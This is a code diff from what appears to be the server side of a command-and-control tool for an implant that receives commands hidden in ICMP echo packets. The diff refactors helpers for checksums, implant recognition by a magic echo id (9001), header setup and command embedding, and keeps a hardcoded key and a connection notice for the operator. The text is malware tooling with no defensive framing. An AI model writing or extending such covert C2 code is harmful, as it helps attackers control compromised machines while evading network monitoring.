@@ -4,7 +4,7 @@
 #include <string.h>
 
 #include "../include/c2.h"
-#include "../include/rc4.h"
+#include "../include/utils.h"
 
 #define KEY "thisisapassword"
 #define KEY_LENGTH 15
@@ -30,30 +30,6 @@ int create_socket(char *interface_to_bind) {
     return sockfd;
 }
 
-// calculate checksum (proudly? stolen from the internet)
-unsigned short cksum(unsigned short *addr, int len) {
-    int nleft = len;
-    int sum = 0;
-    unsigned short *w = addr;
-    unsigned short answer = 0;
-
-    while (nleft > 1) {
-      sum += *w++;
-      nleft -= 2;
-    }
-
-    if (nleft == 1) {
-      *(unsigned char *)(&answer) = *(unsigned char *)w;
-      sum += answer;
-    }
-
-    sum = (sum >> 16) + (sum & 0xffff);
-    sum += (sum >> 16);
-    answer = ~sum;
-
-    return answer;
-}
-
 // get the input and return it's buffer
 unsigned char *get_command(char *input) {
     unsigned char *cipher_text = (unsigned char *) malloc(BUFFER_SIZE);
@@ -69,65 +45,10 @@ unsigned char *get_command(char *input) {
     return cipher_text;
 }
 
-// read from the socket and write the data in a buffer, returns how much have been read
-ssize_t read_from_socket(int sockfd, unsigned char *buffer, size_t size) {
-    ssize_t nbytes = read(sockfd, buffer, size);
-
-    if (nbytes < 0) {
-        return -1;
-    }
-
-    return nbytes;
-}
-
-// check if we got an actual connection from our implant
-/* TODO: dynamic id */
-int check_magic_byte(struct icmphdr *icmp) {
-    if (icmp->type == 8 && icmp->un.echo.id == 9001) {
-        return 1;
-    }
-    return 0;
-}
-
 // print from where we got our connection
 void print_connection_succeed(char *src_ip) {
     printf("[!] Got a connection from %s\n", src_ip);
     puts("[!] Now you should be able to run your commands");
-}
-
-// prep'ing the IP headers for later usage
-struct sockaddr_in prep_ip_headers(struct iphdr *ip) {
-    struct sockaddr_in addr;
-
-    addr.sin_family = AF_INET;
-    addr.sin_addr.s_addr = ip->saddr;
-
-    return addr;
-}
-
-// parse the data section
-unsigned char *parse_data_section(unsigned char *packet) {
-    // get the data section (ignoring the IP & ICMP headers)
-    unsigned char *data = (unsigned char *) (packet + sizeof(struct iphdr) + sizeof(struct icmphdr));
-
-    return data;
-}
-
-// prep'ing the ICMP headers & setting up the checksum
-void prep_icmp_headers(struct icmphdr *icmp, uint16_t checksum) {
-    icmp->checksum = 0;
-    icmp->checksum = checksum;
-    icmp->type = 8;
-    icmp->un.echo.id = 9001;
-}
-
-// append the command to the data section of the packet
-void append_to_data_section(struct icmphdr *icmp, unsigned char *data, unsigned char *input) {
-    memcpy(data, input, strlen((char *) input));
-
-    uint16_t checksum = cksum((unsigned short *) icmp, sizeof(struct icmphdr) + strlen((char *) input));
-
-    prep_icmp_headers(icmp, checksum);
 }
 
 // the actual interaction occurs here
